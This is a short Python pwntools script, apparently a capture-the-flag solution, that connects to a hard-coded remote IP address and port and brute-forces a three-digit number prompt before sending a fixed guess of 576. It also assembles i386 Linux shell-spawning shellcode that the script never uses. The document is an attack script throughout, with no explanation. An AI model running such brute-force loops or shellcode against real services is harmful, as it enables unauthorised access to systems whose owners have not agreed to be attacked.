from pwn import *
context(arch = 'i386', os = 'linux')
shellcode = asm(shellcraft.i386.linux.sh())


def guess(i):
	r=remote("103.237.98.32","25032")
	r.recvuntil("Enter your number:")
	r.sendline(str(i))
	z=r.recv(1024)
	if "You've guessed incorrectly" in z:
		print "Try",i
		return False
	else:
		print i
		return True

def brute():
	for i in range(100,999):
		if guess(i):
			print i,"OK Man!!!"		
			break

def guess2():
	r=remote("103.237.98.32","25032")
	r.recvuntil("Enter your number:")
	r.sendline('576')
	z=r.recv(1024)
	print z
guess2()
